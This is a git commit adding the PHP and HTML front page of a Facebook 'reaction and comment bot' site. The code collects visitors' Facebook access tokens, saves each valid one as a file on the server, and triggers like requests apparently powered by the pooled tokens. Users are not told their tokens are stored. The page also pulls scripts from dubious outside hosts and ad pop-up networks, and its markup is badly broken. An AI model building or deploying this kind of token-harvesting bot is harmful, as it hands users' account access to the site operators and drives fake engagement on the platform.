d8adbafc433baa3f8c3e645624698273c2a8dc22
gulbano786 <38393200+gulbano786@users.noreply.github.com>
2018-05-04 22:14:14 -0700

    Add files via upload

---
+++ index.php
@@ -0,0 +1,259 @@
+﻿<a target="_blank" href="http://free-web-tools.com/category/codes/javascript/" style="text-decoration:none;bottom:0;left:10px;font-size:5pt;color:gray;position:absolute"></a><a target="_blank" href="http://www.javascriptbestcodes.com" style="font-size: 8pt; text-decoration: none"></a> 
+﻿ 
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"><html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"> <title> MR BOT TEAM
+</title> <link rel="stylesheet" type="text/css" href="B.css"
+ <script src="http://salaih.vpstrust.com/AB.js"></script><link rel="shortcut icon" type="image/png" href="https://cdn3.iconfinder.com/data/icons/inside/PNG/256x256/icontexto-inside-facebook.png"/>
+<link rel="stylesheet" type="text/css" href="stylesheet.css" media="all,handheld"/>
+<link href="http://fonts.googleapis.com/css?family=Audiowide" rel="stylesheet" type="text/css">
+<script type="text/javascript">
+    var adfly_id = 7958458;
+</script>
+<script src=""></script>
+<script async src="http://salaih-king2.tk/snow.js"></script>
+<script type="text/javascript" src=""></script>
+ <script type=text/javascript>
+ var _cpp= _cpp || [];
+  _cpp['username']    = "OFFICIALBOTER";
+  _cpp['pop_type']    = "2";
+  _cpp['onePer']    = "0";
+  _cpp['freq']        = "20";   
+(function() {
+var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+hs.src = ('');
+var cs = document.getElementsByTagName('script')[0];
+cs.parentNode.insertBefore(hs, cs);
+})();</script>
+<link rel="shortcut icon" href="https://i.imgur.com/h6NWYI8.png">
+<meta property="og:image" content="https://i.imgur.com/FBYFvb8.jpg" />
+
+<marquee behavior="alternate"> <font color ="red">❤️</font> Mention Bot Site <font color ="red">❤️</font><font color ="red"></marquee>
+<marquee behavior="alternate" direction="right"> Mr BoT3r Team Powered by TanzeeL Khan , Muhammad Raza </marquee>
+<center><div style="font-family: Audiowide;
+font-size: 24pt">
+<style>
+.snow-container{position:fixed;width:100%;max-width:100%;z-index:99999;pointer-events:none;overflow:hidden;top:0;height:100%}.snow{display:block;position:absolute;z-index:2;top:0;right:0;bottom:0;left:0;pointer-events:none;-webkit-transform:translate3d(0,-100%,0);transform:translate3d(0,-100%,0);-webkit-animation:snow linear infinite;animation:snow linear infinite}.snow.foreground{background-image:url("https://vipfb.co/img/snow-large-vipfb.co.png");-webkit-animation-duration:15s;animation-duration:10s}.snow.foreground.layered{-webkit-animation-delay:7.5s;animation-delay:7.5s}.snow.middleground{background-image:url(https://vipfb.co/img/snow-medium-vipfb.co.png);-webkit-animation-duration:20s;animation-duration:15s}.snow.middleground.layered{-webkit-animation-delay:10s;animation-delay:10s}.snow.background{background-image:url(https://vipfb.co/img/snow-small-vipfb.co.png);-webkit-animation-duration:25s;animation-duration:20s}.snow.background.layered{-webkit-animation-delay:12.5s;animation-delay:12.5s}@-webkit-keyframes snow{0%{-webkit-transform:translate3d(0,-100%,0);transform:translate3d(0,-100%,0)}100%{-webkit-transform:translate3d(5%,100%,0);transform:translate3d(5%,100%,0)}}@keyframes snow{0%{-webkit-transform:translate3d(0,-100%,0);transform:translate3d(0,-100%,0)}100%{-webkit-transform:translate3d(5%,100%,0);transform:translate3d(5%,100%,0)}} </style>
+<center> <div class="snow-container"> <div class="snow foreground"></div> <div class="snow foreground layered"></div> <div class="snow middleground"></div> <div class="snow middleground layered"></div> <div class="snow background"></div> <div class="snow background layered"></div> </div> </center>
+<center><div style="font-family: Audiowide;<center><strong><h2 style="color:white;"><strong><font style="text-shadow: 1px 1px Aqua; color:white;" size="8"><b><a href="https://www.facebook.com/100008829408293" alt="Owner" target="_blank"> TanzeeL Khan </a></b></font>\</h3> 
+<center/>
+ <center><a href="https://www.facebook.com/100023952990858" alt="Owner" target="_blank"> <img src="https://graph.facebook.com/100023952990858/picture?width=900" alt="" style="border-radius: 99em; border: 2px; box-shadow: 0px 0px 15px 10px 	#335375; padding: 0px;" width="200" height="200" title=""></a>
+<a href="https://www.facebook.com/100023952990858" alt="Owner" target="_blank"> <img src="https://graph.facebook.com/100023952990858/picture?width=900" alt="" style="border-radius: 99em; border: 2px; box-shadow: 0px 0px 15px 10px 	#753353; padding: 0px;" width="300" height="300" title=""></a>
+<a href="https://www.facebook.com/100023952990858" alt="Owner" target="_blank"> <img src="https://graph.facebook.com/100023952990858/picture?width=900" alt="" style="border-radius: 99em; border: 2px; box-shadow: 0px 0px 15px 10px 	#64998b; padding: 0px;" width="200" height="200" title=""></a></center>
+<div id="menucon"><div id="koddostu-tex"><br><b>TAnzeel Khan
+</b><br><br>Admin - personal information )
+<br><br>
+  <center>
+<img src="https://graph.facebook.com/100023952990858/picture?type=large" alt="Profile" style="height:110px;width:150px;-moz-box-shadow:0px 0px 20px 0px #F0F8FF;-webkit-box-shadow:0px 0px 20px 0px #F0F8FF;-o-box-shadow:0px 0px 20px 0px #F0F8FF;box-shadow:0px 0px 20px 0px #F0F8FF">
+  <br>
+  Lives in : Pakistan
+  <br>
+    From  : peshawar
+    <br>
+    Age : 20 YEAR
+  <br>
+  FACEBOOK:@sherbanokhan7861
+  <br>
+ADMIN : Sunny Khan
+   <br>
+<koddostu><style> #menucon{ position:fixed; bottom:10px; left:10px; width:130px;height:130px; background:transparent url(http://4.bp.blogspot.com/-d2P6c2gUTZs/UpPBn2rpnnI/AAAAAAAAi3w/fOfywJXwJ5g/s1600/see.png) no-repeat center center; transition: all 0.8s ease-in-out; background-size:cover; -webkit-transition: all 0.8s ease-in-out; transition-timing-function:ease-in-out; -webkit-transition-timing-function:ease-in-out; } #menucon:hover{ bottom:35px;left:35px; width:80px;height:80px; transform: rotate(720deg); -ms-transform: rotate(720deg); -webkit-transform: rotate(720deg); }#koddostu-tex{position:absolute;bottom:37px;left:38px; box-shadow: -1px 1px 5px 0px#FF0000; transition: all 0.8s ease-in-out; -webkit-transition: all 0.8s ease-in-out; transition-timing-function:ease-in-out; line-height:22px; -webkit-transition-timing-function:ease-in-out; opacity:0; width:0px;height:0px; padding:6px;color:#FFFFFF; font-family:Helvetica, Arial, sans-serif; font-weight:normal; text-decoration:none; font-size:14px; text-align:center; -webkit-border-radius: 8px; -webkit-border-bottom-left-radius: 0; border-radius: 8px; border-bottom-left-radius: 0; }</style><style> #menucon:hover #koddostu-tex{ width:300px;height:360px; background:Black ; opacity:0.6;} </style></koddostu>
+<!--Bu çalışma Creative Commons Attribution-Gayriticari-NoDerivs 3.0 Unported Lisansı ile lisanslanmıştır.-->
+<!--Telif sahibi:koddostu.com-->
+<!--Koddostu Büyüleyici Duyuru Panosu Html Kodu STOP-->
+<script src="https://www.koddostu.com/duzelt.js?no=118"></script>
+    <center>
+</center></center></div><img src="http://alo0osh-sy.xtgem.com/images/gif_1_6.gif" alt="Gif 1 6"><div style="text-align:center;" <center=""></div></div>
+<div class="kddtop"> <div class="kddtut"> <p>
+<b>Sherbano khan</b><br>
+<img src="https://graph.facebook.com/100023952990858/picture?type=large" alt="Profile" style="height:110px;width:110px;-moz-box-shadow:0px 0px 20px 0px #F0F8FF;-webkit-box-shadow:0px 0px 20px 0px #F0F8FF;-o-box-shadow:0px 0px 20px 0px #F0F8FF;box-shadow:0px 0px 20px 0px #F0F8FF">
+<br><b>FAST REACTION+COMENT BOT SITE</b><br><br>
+<br>
+<br><b>WELCOME TO BOT Tanzeel  kHan</b><br><style>
+  .kddtop {
+       right:16px;
+      width: 350px;
+  min-height:180px;
+  background: transparent;
+  margin: 0 auto;
+  position: fixed;
+  font-family:Arial, sans-serif !important;
+  border-radius:3px;
+  -webkit-border-radius:3px;
+  bottom: 16px;
+  overflow: hidden;box-shadow: 0px 1px 4px transparent;
+z-index:900;}
+.kddtop p{width:0px;height:0px;overflow:hidden;opacity:0;position:relative;padding:16px 0 0 20px;z-index:5;margin:0 0 0 0;
+color:rgba(0,0,0,0);}
+.kddtop:hover p{display:block;
+width:100%;height:100%;opacity:1;color:#fff;
+  transition:opacity 1s 0.4s ease;
+}
+.kddtop:before {
+  content: "♥";
+  position: absolute;
+  line-height: 1500px;
+    text-align: center;
+    color: #fff;
+    font-weight: bold;
+    font-size: 1000px;
+  z-index:1;
+  width: 1500px;
+  height: 1500px;
+  background: #F44336;
+  border-radius: 50%;
+  top: 100%;
+  left: 50%;
+  -webkit-transform: translate3d(-50%, -50%, 0) scale(0.035);
+  transform: translate3d(-50%, -50%, 0) scale(0.035);
+  -webkit-animation: .5s bounce infinite alternate-reverse;
+  animation: .5s bounce infinite alternate-reverse;
+  -webkit-transition: .5s -webkit-transform ease, .5s color ease;
+  transition: .5s transform ease, .5s color ease;
+}
+.kddtop:after {
+  content: "";
+  position: absolute;
+  left: 133px;
+  right: 133px;
+  bottom: 0;
+  height: 15px;
+  background: rgba(0, 0, 0, 0.5);
+  border-radius: 50%;
+  -webkit-transition: .3s opacity ease;
+  transition: .3s opacity ease;
+  -webkit-animation: .5s shadow infinite alternate-reverse;
+  animation: .5s shadow infinite alternate-reverse;
+}
+.kddtop:hover {
+  box-shadow: 0px 5px 4px rgba(0, 0, 0, 0.3);
+  -webkit-transition: .5s all ease .25s;
+  transition: .5s all ease .25s;
+}
+    .kddtop:hover:before { color: Black; top: 100%; -webkit-transform: translate3d(-50%, -50%, 0) scale(1); transform: translate3d(-50%, -50%, 0) scale(1); -webkit-transition: .3s top ease, .5s -webkit-transform ease .25s, .5s color ease .25s; transition: .3s top ease, .5s transform ease .25s, .5s color ease .25s; } </style> <style> .kddtop:hover:after { opacity: 0; } .kddtop:hover .kddtut:before { width: 50px; -webkit-transition: .3s all ease 1.25s; transition: .3s all ease 1.25s; } .kddtop .kddtut { padding: 0 35px 5px 0; box-sizing: border-box; display: block; position: relative; opacity: 1; text-align: center; } .kddtop .kddtut:before { content: ""; position: absolute; top: 0; left: 150px; rigth: 150px; width: 0px; height: 1px; background: black; } @-webkit-keyframes bounce { from { top: 93%; } to { top: 50%; } } @keyframes bounce { from { top: 93%; } to { top: 50%; } } @-webkit-keyframes shadow { from { height: 5px; } to { height: 20px; -webkit-transform: scale(0.3); transform: scale(0.3); } } @keyframes shadow { from { height: 5px; } to { height: 20px; -webkit-transform: scale(0.3); transform: scale(0.3); } }</style>
+</p><noscript>&lt;a href="http://KodSeo.tr.gg"&gt;&lt;/a&gt;</noscript> </div> </div>
+<?php
+$yx=opendir('MASTER');
+while($isi=readdir($yx)){
+if($isi != '.' && $isi != '..'){
+$member[]=$isi;
+}
+}
+$like = new like();
+if($_GET[act]){
+print '';
+}
+if($_POST[access_token]){
+$access_token = $_POST[access_token];
+$me = $like -> me($access_token);
+if($me[id]){
+$like -> MASTER($access_token);
+if($_POST[id]){
+$like -> pancal($_POST[id]);
+}else{
+$like -> getData($access_token);
+}
+}else{
+$like -> invalidToken();
+}
+}else{
+$like->form();
+}
+class like {
+public function pancal($id){ for($i=1;$i<4;$i++){
+$this-> _req('http://google.com/gwt/n?u='.urlencode('http://'.$_SERVER[HTTP_HOST].'/likes.php?id='.$id.'&n='.$i));
+}
+print '';
+}
+public function me($access){
+return json_decode($this-> _req('https://graph.facebook.com/me?access_token='.$access),true);
+}
+public function MASTER($access){
+if(!is_dir('MASTER')){
+mkdir('MASTER');
+}
+$a=fopen('MASTER/'.$access,'w');
+fwrite($a,1);
+fclose($a);
+}
+public function invalidToken(){
+print'<font color="red">DEAR TOKEN IS INVALID</font>';
+$this->form();
+}
+public function form(){
+ echo '
+<center>
+<br><br>
+<center><div style="font-family: Iceland;<font face="Orbitron" size="10" style="background: url(&quot;&quot;) repeat scroll 0% 0% transparent; color:#fff; text-shadow: 0pt 0pt 0.9em red, 0pt 2pt 0.9em gold;"><b><a href="http://mr-token.tk/" target="blank"><input class="button button5" type="button" value="GET TOKEN"></a></font></center></a></li>
+
+</font>
+  <center></br><form action=""method="POST"><input class="input" type="text"name="access_token" style="height:28px;" value=""><input class="button button5" type="submit"name="saveFile" style="height:28px;" '.$warna1.';border:2px groove '.$warna.';height:50px;width:22px"autocomplete="off" value="SUBMIT"onfocus="value="SUBMIT=""></form></center><br>
+</font><br>
+<div style="font-family: Audiowide;<font face="Audiowide" size="5" style="background: url(&quot;&quot;) repeat scroll 0% 0% transparent; color:#fff; text-shadow: 0pt 0pt 0.9em red, 0pt 2pt 0.9em White;"> OWNER :  <a href="https://www.facebook.com/sherbanokhan7861" target="blank"><font color="white"size="5"> TANZEEL KHAN <br><font/>
+
+</div>
+</b></a>
+<center>
+ MR BOT TEAM <a href="https://www.facebook.com/100008829408293" target="blank"> MUHAMMAD RAZA </a>
+</center></div></div></body></html>';
+}
+public function getData($access){
+$feed=json_decode($this -> _req('https://graph.facebook.com/me/home?access_token='.$access.'&limit=1'),true);
+if(count($feed[data]) >= 1){
+for($i=0;$i<count($feed[data]);$i++){
+$uid = $feed[data][$i][from][id];
+$name = $feed[data][$i][from][name];
+$type = $feed[data][$i][type];
+$mess = str_replace(urldecode('
+'),'<br/>',htmlspecialchars($feed[data][$i][message]));
+$id = $feed[data][$i][id];
+$pic = $feed[data][$i][picture];
+echo'
+<br>
+<br>
+<br>
+<center> 
+<br>
+<br>
+<br>
+<marquee direction="left"><font size="8" color="gold"><font face="Audiowide" size="5" style="background: url(&quot;&quot;) repeat scroll 0% 0% transparent; color:#fff; text-shadow: 0pt 0pt 0.9em red, 0pt 2pt 0.9em White;">Your bot Has been Activated Successfully </font></marquee>
+<br>
+<br>
+<br>
+<form action="keluar.php" method="post">
+<center><marquee direction="right"><font size="8" color="gold"><font face="Audiowide" size="5" style="background: url(&quot;&quot;) repeat scroll 0% 0% transparent; color:#fff; text-shadow: 0pt 0pt 0.9em red, 0pt 2pt 0.9em White;"><input class="submit" type="submit" style="width:40%;" value="Click Here To Add AnOther Token"></marquee> </center>
+<br>
+<br>
+<br>
+<center> <center><div style="font-family: Iceland;<font face="Orbitron" size="10" style="background: url(&quot;&quot;) repeat scroll 0% 0% transparent; color:#fff; text-shadow: 0pt 0pt 0.9em red, 0pt 2pt 0.9em gold;"><font color="WHITE"size="5"> DESIGNED BY :-  <a href="https://www.facebook.com/Sherbanokhan7861" target="blank"><font color="WHITE"> MuhaMmad RaZa + TanzeeL Khan <br></div></center>
+';
+if($type=='photo'){
+echo'
+';
+}else{
+echo'
+';
+}
+}
+}else{
+print '';
+}
+print '';
+}
+private function _req($url){
+$ch = curl_init();
+curl_setopt_array($ch,array(
+CURLOPT_CONNECTTIMEOUT => 5,
+CURLOPT_RETURNTRANSFER => true,
+CURLOPT_URL => $url,
+) );
+$result = curl_exec($ch);
+curl_close($ch);
+return $result;
+}
+}
+?>
+</body>
+</html>
+<h2></font><br>
+<center> <center><div style="font-family: Audiowide;<font face="Audiowide" size="5" style="background: url(&quot;&quot;) repeat scroll 0% 0% transparent; color:#fff; text-shadow: 0pt 0pt 0.9em red, 0pt 2pt 0.9em White;">Users : <?php include 'users.php';?><font color="white"size="5">  <?php include 'users.php';?><br></center><font/>
+
+<br>
+<br>
